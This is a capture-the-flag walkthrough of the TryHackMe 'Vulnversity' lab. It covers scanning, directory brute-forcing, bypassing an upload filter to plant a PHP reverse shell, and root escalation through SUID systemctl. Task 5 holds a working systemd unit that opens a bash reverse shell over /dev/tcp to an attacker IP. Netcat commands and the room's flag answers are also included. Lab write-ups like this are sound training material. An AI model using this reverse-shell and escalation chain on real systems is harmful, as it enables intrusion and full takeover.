# TryHackMe walkthrough

## Vulnversity

> _tihawk | May 14, 2021_

----------------------------------------

### TASK 1. Deploy the machine

<p>Connect to our network and deploy this machine. If you are unsure on how to get connected, complete the <a href="https://tryhackme.com/room/openvpn" target="_blank">OpenVPN room</a> first.</p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. <p>Deploy the machine</p>

```
export IP=10.10.199.139
```

```
OK
```

----------------------------------------

### TASK 2. Reconnaissance 

<p>Gather information about this machine using a network scanning tool called <code>nmap</code>. Check out the <a href="https://tryhackme.com/room/furthernmap" target="_blank">Nmap</a> room for more on this!<br /></p><p>Don't have a Linux machine with nmap on? Deploy your own <a href="https://tryhackme.com/my-machine" target="_blank">AttackBox</a> and control it with your browser.</p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. <p>Scan this box: <b>nmap -sV &lt;machines ip&gt;</b></p><p><b></b></p><div style="text-align:center"><b><img src="https://i.imgur.com/gZqOO8D.png" style="font-size:1rem;font-weight:400;width:134.5px;height:134.5px" /></b></div><p></p><p>nmap is an free, open-source and powerful tool used to discover hosts and services on a computer network. In our example, we are using nmap to scan this machine to identify all services that are running on a particular port. nmap has many capabilities, below is a table summarising some of the functionality it provides.</p><table class="table table-bordered"><tbody><tr><td><b>nmap flag</b></td><td><b>Description</b></td></tr><tr><td>-sV</td><td>Attempts to determine the version of the services running</td></tr><tr><td>-p &lt;x&gt; or -p-</td><td>Port scan for port &lt;x&gt; or scan all ports</td></tr><tr><td>-Pn</td><td>Disable host discovery and just scan for open ports</td></tr><tr><td>-A</td><td>Enables OS and version detection, executes in-build scripts for further enumeration </td></tr><tr><td>-sC</td><td>Scan with the default nmap scripts</td></tr><tr><td>-v</td><td>Verbose mode</td></tr><tr><td>-sU</td><td>UDP port scan</td></tr><tr><td>-sS</td><td>TCP SYN port scan</td></tr></tbody></table><p>There are many nmap "cheatsheets" online that you can use too.</p>

```
nmap -sC -sV -oN nmap/initial -vvv $IP
```

```
OK
```

2. <p>Scan the box, how many ports are open?</p>

```
6
```

3. <p>What version of the squid proxy is running on the machine?</p>

```
3.5.12
```

4. <p>How many ports will nmap scan if the flag <b>-p-400 </b>was used?</p>

```
400
```

5. <p>Using the nmap flag <b>-n</b> what will it not resolve?</p>

```
DNS
```

6. <p>What is the most likely operating system this machine is running?</p>

```
Ubuntu
```

7. <p>What port is the web server running on?</p>

```
3333
```

8. <p>Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)<br /></p>

```
OK
```

----------------------------------------

### TASK 3. Locating directories using GoBuster

<p><span style="font-size:1rem;">Using a fast directory discovery tool called </span><code>GoBuster</code><span style="font-size:1rem;"> you will locate a directory that you can use to upload a shell to.</span></p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. <p>Lets first start of by scanning the website to find any hidden directories. To do this, we're going to use GoBuster.</p><p style="text-align:center;"><img src="https://i.imgur.com/gODlTeh.png" style="width:125.203px;height:134.063px;" /></p><p>GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names. For this machine, we will focus on using it to brute-force directories.</p><p>Download GoBuster <a href="https://github.com/OJ/gobuster">here</a>, or if you're on Kali Linux 2020.1+ run <span style="font-weight:bold;color:rgb(8, 82, 148);">sudo apt-get install gobuster</span></p><p>To get started, you will need a wordlist for GoBuster (which will be used to quickly go through the wordlist to identify if there is a public directory available. If you are using <a href="https://tryhackme.com/room/kali">Kali Linux</a> you can find many wordlists under <b>/usr/share/wordlists.</b></p><p>Now lets run GoBuster with a wordlist: <b>gobuster dir -u http://&lt;ip&gt;:3333 -w &lt;word list location&gt;</b></p><table class="table table-bordered"><tbody><tr><td><b>GoBuster flag</b></td><td><b>Description</b></td></tr><tr><td>-e</td><td>Print the full URLs in your console</td></tr><tr><td>-u</td><td>The target URL</td></tr><tr><td>-w</td><td>Path to your wordlist</td></tr><tr><td>-U and -P</td><td>Username and Password for Basic Auth</td></tr><tr><td>-p <b>&lt;x&gt;</b></td><td>Proxy to use for requests</td></tr><tr><td>-c &lt;http cookies&gt;</td><td>Specify a cookie for simulating your auth</td></tr></tbody></table>

```
gobuster dir -u http://$IP:3333 -w /opt/directory-list-2.3-medium.txt 
```

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.199.139:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/14 21:47:11 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 322] [--> http://10.10.199.139:3333/images/]
/css                  (Status: 301) [Size: 319] [--> http://10.10.199.139:3333/css/]   
/js                   (Status: 301) [Size: 318] [--> http://10.10.199.139:3333/js/]    
/fonts                (Status: 301) [Size: 321] [--> http://10.10.199.139:3333/fonts/] 
/internal             (Status: 301) [Size: 324] [--> http://10.10.199.139:3333/internal/]
Progress: 18844 / 220561 (8.54%)                                                        ^C
[!] Keyboard interrupt detected, terminating.
                                                                                         
===============================================================
2021/05/14 21:49:39 Finished
===============================================================
```

```
OK
```

2. <p>What is the directory that has an upload form page?</p>

```
/internal/
```

----------------------------------------

### TASK 4. Compromise the webserver

<p>Now you have found a form to upload files, we can leverage this to upload and execute our payload that will lead to compromising the web server.</p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Try upload a few file types to the server, what common extension seems to be blocked?

```
.php
```

2. <p>To identify which extensions are not blocked, we're going to fuzz the upload form.</p><p>To do this, we're going to use <b>BurpSuite. </b>If you are unsure to what BurpSuite is, or how to set it up please complete our <a href="https://tryhackme.com/room/rpburpsuite">BurpSuite room</a> first.</p><p><img src="https://i.imgur.com/j71CW1A.png" style="text-align:center;font-size:1rem;width:484.281px;height:121.531px" /><br /><br /></p>

```
OK
```

3. <p><span style="font-size:1rem">We're going to use Intruder (used for automating </span>customised<span style="font-size:1rem"> attacks).</span></p><p>To begin, make a wordlist with the following extensions in:</p><p><img src="https://i.imgur.com/ED153Nx.png" style="font-size:1rem;width:227px;height:103.976px" /></p><p><span style="font-size:1rem">Now make sure BurpSuite is configured to intercept all your browser traffic. Upload a file, once this request is captured, send it to the Intruder. Click on "Payloads" and select the "Sniper" attack type.</span></p><p><span style="font-size:1rem">Click the "Positions" tab now, find the filename and "Add </span>§" to the extension. It should look like so:</p><p><img src="https://i.imgur.com/6dxnzq6.png" style="width:392px;height:267.485px" /></p><p>Run this attack, what extension is allowed?</p>

```
.phtml
```

4. <p>Now we know what extension we can use for our payload we can progress.</p><p>We are going to use a PHP reverse shell as our payload. A reverse shell works by being called on the remote host and forcing this host to make a connection to you. So you'll listen for incoming connections, upload and have your shell executed which will beacon out to you to control!</p><p>Download the following reverse PHP shell <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">here</a>.</p><p>To gain remote access to this machine, follow these steps:<br /></p><ol><li>Edit the php-reverse-shell.php file and edit the ip to be your tun0 ip (you can get this by going to <a href="http://10.10.10.10">http://10.10.10.10</a> in the browser of your TryHackMe connected device).<br /><br /></li><li>Rename this file to php-reverse-shell.phtml<br /><br /></li><li>We're now going to listen to incoming connections using netcat. Run the following command: <b>nc -lvnp 1234<br /><br /></b></li><li>Upload your shell and navigate to <b>http://&lt;ip&gt;:3333/internal/uploads/php-reverse-shell.phtml </b>- This will execute your payload<br /><br /></li><li>You should see a connection on your netcat session</li></ol><p><img src="https://i.imgur.com/FGcvTCp.png" style="width:543px;height:133.866px" /></p>

```
nc -lnvp 4444
```

```
# stabilisation
$ python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
^Z
stty raw -echo; fg
```

```
OK
```

5. <p>What is the name of the user who manages the webserver?</p>

```
bill
```

6. <p>What is the user flag?</p>

```
8bd7992fbe8a6ad22a63361004cfcedb
```

----------------------------------------

### TASK 5. Privilege Escalation

<p>Now you have compromised this machine, we are going to escalate our privileges and become the superuser (root).<br /></p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. <p>In Linux, SUID (<b>set owner userId upon execution)</b> is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).</p><p>For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.</p><p><img src="https://i.imgur.com/ZhaNR2p.jpg" style="width:215.275px;height:140.109px;" /></p><p>On the system, search for all SUID files. What file<span style="font-size:1rem;"> stands out?</span></p>

```
find / -perm /4000 2>/dev/null
```
```
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```

```
# hint
Use the command: find / -user root -perm -4000 -exec ls -ldb {} \;
```

```
/bin/systemctl
```

2. <p>Its challenge time! We have guided you through this far, are you able to exploit this system further to escalate your privileges and get the final answer?</p><p>Become root and get the last flag (/root/root.txt)</p>

[https://gtfobins.github.io/gtfobins/systemctl/#suid](https://gtfobins.github.io/gtfobins/systemctl/#suid)

* create a `root.service` service on attacker
```bash
[Unit]
Description=giveMeRoot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.9.5.147/9999 0>&1'

[Install]
WantedBy=multi-user.target
```
* listen for the service on target
```bash
www-data@vulnuniversity:/dev/shm$ nc -vl 44444 > root.service
```
* send service from attacker
```
nc -n 10.10.199.139 44444 < root.service
```
* listen on attacker on port 9999
```
nc -lvnp 9999
```
* enable and start service on target
```
/bin/systemctl enable /dev/shm/root.service

/bin/systemctl start root.service
```
* we have root! stabilise
```
$ python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
^Z
stty raw -echo; fg
```

```
a58ff8579f0a9270368d33a9966c7fd5
```

